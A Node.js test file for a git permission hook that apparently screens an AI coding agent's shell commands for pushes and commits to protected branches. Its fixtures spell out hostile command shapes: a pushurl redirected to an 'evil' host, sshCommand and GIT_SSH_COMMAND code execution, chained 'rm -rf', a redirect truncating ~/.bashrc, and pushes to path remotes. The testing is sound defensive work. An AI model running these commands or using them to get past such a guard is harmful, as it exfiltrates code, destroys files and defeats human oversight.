// Zero-dep tests for git-guard.mjs (the PreToolUse hook). Run:
// node --test 'cadence-core/bin/*.test.mjs'
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const GUARD = join(dirname(fileURLToPath(import.meta.url)), 'git-guard.mjs');

// Hermetic global config (never read the dev's real one).
const NO_GLOBAL = join(mkdtempSync(join(tmpdir(), 'cad-guard-')), 'no-global.json');

// Fixture git calls must never read the dev's global/system git config
// (commit.gpgsign, init.defaultBranch hooks, ... would break the fixtures).
const GIT_ENV = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_SYSTEM: '/dev/null' };

/** Run a git command against a fixture dir, hermetically. */
function git(args, opts = {}) {
  execFileSync('git', args, { stdio: 'ignore', env: GIT_ENV, ...opts });
}

/** Feed the hook a raw stdin payload; return trimmed stdout. */
function guardRaw(input) {
  return execFileSync('node', [GUARD], {
    encoding: 'utf8',
    input,
    env: { ...process.env, CADENCE_GLOBAL_CONFIG: NO_GLOBAL },
  }).trim();
}

/** Feed the hook a PreToolUse payload; return the parsed decision or null. */
function guard(command, cwd) {
  const stdout = guardRaw(JSON.stringify({ tool_input: { command }, cwd }));
  return stdout ? JSON.parse(stdout).hookSpecificOutput : null;
}

/** A Cadence project fixture: git repo on `branch` with a .planning dir. */
function project(branch, config) {
  const dir = mkdtempSync(join(tmpdir(), 'cad-guard-repo-'));
  git(['-C', dir, 'init', '-q', '-b', branch]);
  writeFileSync(join(dir, 'f.txt'), 'x');
  git(['-C', dir, 'add', '.']);
  git(['-C', dir, '-c', 'user.email=t@t', '-c', 'user.name=t',
    'commit', '-q', '-m', 'init']);
  mkdirSync(join(dir, '.planning'), { recursive: true });
  if (config) writeFileSync(join(dir, '.planning', 'config.json'), JSON.stringify(config));
  return dir;
}

test('silent outside a Cadence project', () => {
  const dir = mkdtempSync(join(tmpdir(), 'cad-guard-plain-'));
  assert.equal(guard('git push origin main', dir), null);
});

test('silent for non-git commands inside a project', () => {
  assert.equal(guard('ls -la', project('main')), null);
});

test('git push always asks (publishing is /cad-land\'s call)', () => {
  const d = guard('git push origin feature', project('feature'));
  assert.equal(d.hookEventName, 'PreToolUse'); // the harness routes on this
  assert.equal(d.permissionDecision, 'ask');
  assert.match(d.permissionDecisionReason, /cad-land/);
});

test('auto_close: a plain publish of the current non-protected branch is exempt (silent)', () => {
  const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
  assert.equal(guard('git push -u origin cadence/v1.1.0-rc.2', dir), null);
});

test('auto_close: a push while HEAD is a protected branch still asks', () => {
  const d = guard('git push origin main', project('main', { git: { auto_close: true } }));
  assert.equal(d.permissionDecision, 'ask');
});

test('auto_close explicitly false: a feature-branch push still asks', () => {
  const d = guard('git push -u origin cadence/v1.1.0-rc.2',
    project('cadence/v1.1.0-rc.2', { git: { auto_close: false } }));
  assert.equal(d.permissionDecision, 'ask');
});

test('auto_close: a --force push is not a plain publish and still asks', () => {
  const d = guard('git push --force origin cadence/v1.1.0-rc.2',
    project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
  assert.equal(d.permissionDecision, 'ask');
});

test('auto_close: a src:dst refspec targeting a protected base still asks', () => {
  const d = guard('git push origin cadence/v1.1.0-rc.2:main',
    project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
  assert.equal(d.permissionDecision, 'ask');
});

// The exemption is a whitelist: these push shapes are dangerous or unparseable
// and must ask despite repo auto_close + HEAD on a non-protected feature branch.
// (git decomposes -fu into -f -u and force-pushes; -d is --delete; a quoted
// token parses differently from what the shell runs; --x=y flags can retarget.)
for (const [label, command] of [
  ['bundled short flags -fu (force+set-upstream)', 'git push -fu origin cadence/v1.1.0-rc.2'],
  ['bundled short flags -uf (set-upstream+force)', 'git push -uf origin cadence/v1.1.0-rc.2'],
  ['short alias -d (--delete)', 'git push -d origin cadence/v1.1.0-rc.2'],
  ['quoted protected target "main"', 'git push origin "main"'],
  ['quoted refspec cadence/x:main', 'git push origin "cadence/v1.1.0-rc.2:main"'],
  ['--receive-pack=evil retarget', 'git push --receive-pack=evil origin cadence/v1.1.0-rc.2'],
  ['--force-with-lease=origin/x', 'git push --force-with-lease=origin/x origin cadence/v1.1.0-rc.2'],
]) {
  test(`auto_close: whitelist rejects ${label} (asks)`, () => {
    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
    assert.notEqual(d, null);
    assert.equal(d.permissionDecision, 'ask');
  });
}

// A global option BEFORE `push` (config injection, alternate git-dir/namespace/
// exec-path) can retarget the push destination or alter its ref context, so it
// disqualifies the exemption even with repo auto_close + HEAD on the feature
// branch. `-c remote.origin.pushurl=...` retargets to an attacker URL;
// `-c core.sshCommand=...` is RCE; the sanctioned publish carries none of these.
for (const [label, command] of [
  ['-c remote.origin.pushurl injection', 'git -c remote.origin.pushurl=http://evil push origin cadence/v1.1.0-rc.2'],
  ['-c core.sshCommand injection (RCE)', 'git -c core.sshCommand=x push origin cadence/v1.1.0-rc.2'],
  ['--config-env pre-push global', 'git --config-env=X push origin cadence/v1.1.0-rc.2'],
  ['--namespace pre-push global', 'git --namespace=other push origin cadence/v1.1.0-rc.2'],
  ['--exec-path pre-push global', 'git --exec-path=/tmp push origin cadence/v1.1.0-rc.2'],
]) {
  test(`auto_close: a pre-push global option (${label}) disqualifies the exemption (asks)`, () => {
    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
    assert.notEqual(d, null);
    assert.equal(d.permissionDecision, 'ask');
  });
}

// The exemption fires ONLY for a single lone statement that starts with
// `git push`. A leading env-var assignment (RCE via git's ssh transport), a
// chained/compound statement, a pipe, or command substitution each smuggles
// past a first plain-looking push, so all must ask despite repo auto_close +
// HEAD on the feature branch.
for (const [label, command] of [
  ['GIT_SSH_COMMAND env prefix (RCE)', 'GIT_SSH_COMMAND=/tmp/x git push origin cadence/v1.1.0-rc.2'],
  ['benign-looking FOO=bar env prefix', 'FOO=bar git push origin cadence/v1.1.0-rc.2'],
  ['chained second push to a protected base', 'git push origin cadence/v1.1.0-rc.2; git push origin cadence/v1.1.0-rc.2:main'],
  ['&& trailing destructive command', 'git push origin cadence/v1.1.0-rc.2 && rm -rf tmpdir'],
  ['pipe to a trailing command', 'git push origin cadence/v1.1.0-rc.2 | tee log'],
  ['command substitution $(...) argument', 'git push origin $(echo cadence/v1.1.0-rc.2)'],
  ['backtick command substitution', 'git push origin `echo x`'],
]) {
  test(`auto_close: whitelist rejects ${label} (asks)`, () => {
    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
    assert.notEqual(d, null);
    assert.equal(d.permissionDecision, 'ask');
  });
}

// The exemption is the fully explicit shape `git push [safe-flags]
// <remote-name> <current-branch>` and nothing looser (tightened after the
// blocking security review). A shell metacharacter glued to a token survives
// word-splitting (`origin>~/.bashrc` is ONE word, yet the shell honors the `>`
// and truncates the file); a path remote exfiltrates the branch to an
// unvetted destination; an implicit push (bare `git push`, or no branch)
// publishes ALL matching branches under push.default=matching, protected ones
// included. All must ask despite repo auto_close + HEAD on the feature branch.
for (const [label, command] of [
  ['redirect glued to the remote token', 'git push origin>~/.bashrc cadence/v1.1.0-rc.2'],
  ['separate redirect token', 'git push origin cadence/v1.1.0-rc.2 >/tmp/x'],
  ['trailing & (background)', 'git push origin cadence/v1.1.0-rc.2 &'],
  ['filesystem-path remote /tmp/evil', 'git push /tmp/evil cadence/v1.1.0-rc.2'],
  ['relative-path remote ../evil', 'git push ../evil cadence/v1.1.0-rc.2'],
  ['bare git push (implicit remote+branch)', 'git push'],
  ['git push origin (implicit branch)', 'git push origin'],
  ['extra third positional', 'git push origin cadence/v1.1.0-rc.2 extra'],
]) {
  test(`auto_close: explicit-shape whitelist rejects ${label} (asks)`, () => {
    const d = guard(command, project('cadence/v1.1.0-rc.2', { git: { auto_close: true } }));
    assert.notEqual(d, null);
    assert.equal(d.permissionDecision, 'ask');
  });
}

test('auto_close: a benign combined short flag -uq stays exempt (silent)', () => {
  const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
  assert.equal(guard('git push -uq origin cadence/v1.1.0-rc.2', dir), null);
  assert.equal(guard('git push -u -q origin cadence/v1.1.0-rc.2', dir), null);
});

test('auto_close: explicit plain publishes (plain and -u) stay exempt (silent)', () => {
  const dir = project('cadence/v1.1.0-rc.2', { git: { auto_close: true } });
  assert.equal(guard('git push origin cadence/v1.1.0-rc.2', dir), null);
  assert.equal(guard('git push -u origin cadence/v1.1.0-rc.2', dir), null);
});

test('auto_close set ONLY in the global layer never mutes the guard (repo-layer read)', () => {
  // Repo config omits auto_close; a global auto_close must not exempt the push.
  const globalCfg = join(mkdtempSync(join(tmpdir(), 'cad-guard-glob-')), 'g.json');
  writeFileSync(globalCfg, JSON.stringify({ git: { auto_close: true } }));
  const dir = project('cadence/v1.1.0-rc.2', { git: {} });
  const stdout = execFileSync('node', [GUARD], {
    encoding: 'utf8',
    input: JSON.stringify({ tool_input: { command: 'git push -u origin cadence/v1.1.0-rc.2' }, cwd: dir }),
    env: { ...process.env, CADENCE_GLOBAL_CONFIG: globalCfg },
  }).trim();
  const d = stdout ? JSON.parse(stdout).hookSpecificOutput : null;
  assert.equal(d.permissionDecision, 'ask');
});

test('commit on a protected branch asks by default, silent on a task branch', () => {
  const d = guard('git commit -m "x"', project('main'));
  assert.equal(d.permissionDecision, 'ask');
  assert.match(d.permissionDecisionReason, /protected/);
  assert.equal(guard('git commit -m "x"', project('improve/thing')), null);
});

test('git.on_protected=refuse denies; =allow stays silent', () => {
  const refuse = guard('git commit -m "x"',
    project('main', { git: { on_protected: 'refuse' } }));
  assert.equal(refuse.permissionDecision, 'deny');
  assert.equal(guard('git commit -m "x"',
    project('main', { git: { on_protected: 'allow' } })), null);
});

test('custom protected_branches list is honored', () => {
  const d = guard('git commit -m "x"',
    project('release', { git: { protected_branches: ['release'] } }));
  assert.equal(d.permissionDecision, 'ask');
  assert.equal(guard('git commit -m "x"',
    project('main', { git: { protected_branches: ['release'] } })), null);
});

test('git stash push is not a publish (subcommand-aware matching)', () => {
  assert.equal(guard('git stash push -m wip', project('main')), null);
});

test('push as an argument or inside quotes never fires the rail', () => {
  const p = project('main');
  assert.equal(guard('git log --grep "push"', p), null);
  assert.equal(guard('git log --grep push', p), null);
  assert.equal(guard('echo "git push"', p), null);
});

test('global git options are skipped when finding the subcommand', () => {
  const d = guard('git -C . -c user.name=t push origin x', project('feature'));
  assert.equal(d.permissionDecision, 'ask');
});

test('compound command still catches the push half', () => {
  const d = guard('git add . && git push', project('feature'));
  assert.equal(d.permissionDecision, 'ask');
});

test('guard applies from a subdirectory of the project (walk-up)', () => {
  const dir = project('main');
  const sub = join(dir, 'src', 'deep');
  mkdirSync(sub, { recursive: true });
  const d = guard('git commit -m "x"', sub);
  assert.equal(d.permissionDecision, 'ask');
  assert.match(d.permissionDecisionReason, /protected/);
});

test('walk-up stops at a repo root without .planning (still not policed)', () => {
  // A plain repo whose PARENT happens to contain .planning must not be policed.
  const outer = mkdtempSync(join(tmpdir(), 'cad-guard-outer-'));
  mkdirSync(join(outer, '.planning'));
  const inner = join(outer, 'other-repo');
  mkdirSync(inner);
  git(['-C', inner, 'init', '-q', '-b', 'main']);
  assert.equal(guard('git push origin main', inner), null);
});

test('commit guard degrades silently when .planning has no git repo', () => {
  // planningRoot finds the project, but `git rev-parse` fails - the guard
  // must swallow that and never block (a broken guard blocks nothing).
  const dir = mkdtempSync(join(tmpdir(), 'cad-guard-norepo-'));
  mkdirSync(join(dir, '.planning'));
  assert.equal(guard('git commit -m "x"', dir), null);
});

test('detached HEAD is not a protected branch (rev-parse says HEAD)', () => {
  const dir = project('main');
  git(['-C', dir, 'checkout', '-q', '--detach']);
  assert.equal(guard('git commit -m "x"', dir), null);
});

test('malformed stdin exits 0 with no output (guard never blocks work)', () => {
  assert.equal(guardRaw('not json {'), '');
});

test('payload without a command stays silent inside a project', () => {
  const dir = project('main');
  assert.equal(guardRaw(JSON.stringify({ tool_input: {}, cwd: dir })), '');
});
